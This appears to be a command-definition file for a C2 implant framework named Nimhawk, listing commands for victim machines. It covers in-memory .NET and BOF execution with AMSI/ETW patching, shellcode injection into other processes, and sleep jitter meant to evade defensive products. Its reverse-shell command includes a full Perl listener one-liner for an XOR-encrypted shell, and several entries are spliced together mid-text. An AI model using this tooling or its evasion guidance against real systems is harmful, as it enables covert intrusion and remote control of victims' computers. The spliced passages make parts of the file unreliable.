    description: "(GUI) <BYPASSAMSI=0> <BLOCKETW=0> [localfilepath] <arguments> Execute .NET assembly from memory. AMSI/ETW patched by default. Loads the CLR."
    help: |
      [RISKY COMMAND, GUI COMMAND]
      Takes two optional arguments to indicate whether or not AMSI and ETW should be patched (patched by default, unless already patched).
      Additionally, takes a mandatory argument with the local file path to the .NET assembly to execute, 
      and optionally any arguments to pass to the assembly.

      This command executes a C# / .NET assembly binary. Implant will return the console output of the executed .NET assembly.

      Running a .NET assembly will load the Common Language Runtime (CLR) into the target process, be mindful of the OPSEC implications of this.

      [RISKY COMMAND, GUI COMMAND]
      Takes a mandatory argument with the local file path to the BOF to execute, and a mandatory argument with the entrypoint of the BOF.
      Optionally, takes any number of arguments to pass to the BOF.
      Arguments are passed as argument-type pairs, where the type can be either of the following:
      - 'string' (alias: 'z')
      - 'wstring' (or 'Z')
      - 'integer' (aliases: 'int' or 'i')
      - 'short' ('s')
      - 'binary' ('bin' or 'b')

      This command executes a Beacon Object File (BOF). Implant will return the console output of the executed BOF.
      For more information and examples, refer to the Implant README file.

      CAUTION: BOFs are volatile by nature, and running a faulty BOF or passing wrong arguments or types WILL crash your Implant session! 
      Make sure to test BOFs before deploying!

      where it will be accessible through the 'Downloads' tab in the web GUI.

  - command: shell
    server_command: False
    risky_command: True
    gui_command: False
    description: "[command] Execute a shell command."
    help: |
      [RISKY COMMAND]
      Takes a mandatory argument with the shell command to execute.

      This command executes a shell command on the target system. Implant will return the console output of the executed shell command.

      CAUTION: Implant will run 'cmd.exe /c ...' as a child process of the Implant process. Be mindful of the OPSEC implications of this.

  - command: shinject
    server_command: False
    risky_command: True
    gui_command: True
    description: "(GUI) [targetpid] [localfilepath] Load raw shellcode from a file and inject it into the specified process's memory space using dynamic invocation."
    help: |
      [RISKY COMMAND, GUI COMMAND]
      Takes two mandatory arguments: the target process ID and the local path to the shellcode file.

      This command loads raw shellcode from a local file and injects it into the specified process's memory.
      This command uses dynamic invocation (D/Invoke) to inject the shellcode using Native APIs.
      The used injection method is relatively straightforward, so be mindful of the OPSEC implications of this.
      If stealthy injection is a requirement, consider using a (custom) BOF instead through the 'inline-execute' command.

  - command: sleep
    server_command: False
    risky_command: False
    gui_command: False
    description: "[sleeptime] <jitter%> Change the sleep time of the current Implant."
    help: |
      Takes two arguments: the new sleep time in seconds, and optionally a jitter percentage.

      Will change the sleep time of the current Implant.
      The sleep time is the time the Implant will wait between each command execution.
      The jitter percentage is the percentage of the sleep time that will be added or subtracted from the sleep time.
      A high sleep time should be used to avoid detection by defensive products.

      Example: 'sleep 60 10' will set the sleep time to 60 seconds, and add or subtract up to 6 seconds randomly per check-in.

  - command: powershell
    server_command: False
    risky_command: True
    gui_command: False
    description: "<BYPASSAMSI=0> <BLOCKETW=0> [command] Execute a PowerShell command in an unmanaged runspace. Loads the CLR."
    help: |
      [RISKY COMMAND]
      Takes two optional arguments to indicate whether AMSI and ETW should be bypassed, and a mandatory argument with the PowerShell command to execute.

      This command executes a PowerShell command in an unmanaged runspace.
      While this does NOT spawn a child process or any instance of 'powershell.exe', 
      it does load the Common Language Runtime (CLR) into the current process, and opens a console through the 'conhost.exe' process. 
      Be mindful of the OPSEC implications of this.

  - command: upload
    server_command: False
    risky_command: False
    gui_command: False
    description: "(GUI) [localfilepath] <remotefilepath> Upload a file from the Nimhawk server to the victim machine."

      Will return the user ID that Implant is running as using the Windows API. 
      Will add an asterisk to the name (*) if the user's token is elevated.

  - command: "reverse-shell"
    description: "Start a PowerShell reverse shell with XOR encryption"
    help: |
      [RISKY COMMAND]
      Starts a PowerShell reverse shell that connects to the specified IP and port.
      The communication is encrypted using XOR with a 32-bit key.
      
      Usage:
        reverse-shell <IP:PORT> <XOR_KEY>
      
      Arguments:
        IP:PORT    - Target IP and port in format IP:PORT (e.g., 192.168.1.100:4444)
        XOR_KEY    - Required 32-bit XOR key in decimal or hex (0x prefix)
      
      Example:
        reverse-shell 192.168.1.100:4444 0x41424344
        reverse-shell 192.168.1.100:4444 123456789
      
      To receive the shell, use the following Perl command, dont forget to replace the XOR_KEY and PORT with your own:
      
      ```
      perl -e '$KEY=0x41414242;$PORT=9999;use IO::Socket::INET;use MIME::Base64;$|=1;my $k0=($KEY>>24)&0xFF;my $k1=($KEY>>16)&0xFF;my $k2=($KEY>>8)&0xFF;my $k3=$KEY&0xFF;sub d{my $s=shift;return""unless $s;my $b;eval{$b=decode_base64($s)};return"[Error]"if$@;my $r="";for(my $i=0;$i<length($b);$i++){my $kb=$i%4==0?$k0:$i%4==1?$k1:$i%4==2?$k2:$k3;$r.=chr(ord(substr($b,$i,1))^$kb);}return $r;}sub e{my $s=shift;my $r="";for(my $i=0;$i<length($s);$i++){my $kb=$i%4==0?$k0:$i%4==1?$k1:$i%4==2?$k2:$k3;$r.=chr(ord(substr($s,$i,1))^$kb);}return encode_base64($r,"");}$s=IO::Socket::INET->new(Proto=>"tcp",LocalAddr=>"0.0.0.0",LocalPort=>$PORT,Listen=>1,Reuse=>1)or die;print"\n[*] Waiting for connection on port $PORT with XOR key 0x".sprintf("%X",$KEY)."...\n";$c=$s->accept();print"[*] Connection received\n";$c->autoflush(1);while(<$c>){chomp;next unless $_;print d($_)."\n";print"> ";$i=<STDIN>;last unless defined $i;chomp $i;last if $i eq"exit";$c->print(e($i)."\n");}$c->close();$s->close();'
      ```
      
      Replace $XOR_KEY with your key and $PORT with your listening port.
      
      OPSEC Considerations:
      - Uses unmanaged PowerShell runspace (no powershell.exe process)
      - Communication is XOR encrypted with user-provided key
      - AMSI and ETW are patched by default
      - No child processes are created
      - Uses direct CLR loading
      - No hardcoded encryption keys
